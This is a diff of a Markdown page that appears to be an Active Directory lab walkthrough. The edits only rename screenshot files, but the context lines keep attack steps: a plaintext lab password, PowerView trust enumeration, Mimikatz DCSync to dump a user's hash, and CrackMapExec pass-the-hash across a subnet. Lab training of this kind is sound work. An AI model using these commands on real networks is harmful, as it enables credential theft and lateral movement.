@@ -11,7 +11,7 @@
 
 4\. Create a new user with the name `secure_admin` and the password `rFKbUJrDu$sz*36ffKr6`.
 
-![](<../../.gitbook/assets/image (22).png>)
+![](<../../.gitbook/assets/image (22) (1).png>)
 
 5\. Make sure "Password never expires" is checked and "User must change password at next logon" is unchecked when creating the user.
 
@@ -85,7 +85,7 @@ Get-DomainForeignGroupMember -Domain secure.local
 ConvertFrom-SID S-1-5-21-320929719-844265543-1524670925-1602
 ```
 
-![](<../../.gitbook/assets/image (78) (1).png>)
+![](<../../.gitbook/assets/image (78) (1) (1).png>)
 
 5\. The user `bank\secure_admin` from `bank.local` is member of `local admin data` in `secure.local`. We can also see this in bloodhound after collecting the data for both domains and loading it into the BloodHound GUI.
 
@@ -113,7 +113,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:bank\secure_admin /domain:bank.
 cme smb 10.0.0.0/24 -u secure_admin -H a0f6b4d3c6a9da1204520ccd72e54597 -d bank.local
 ```
 
-![](<../../.gitbook/assets/image (39).png>)
+![](<../../.gitbook/assets/image (39) (1).png>)
 
 8\. The user `secure_admin` from `bank.local` is local admin to the `DATA01` machine from `secure.local`.
 
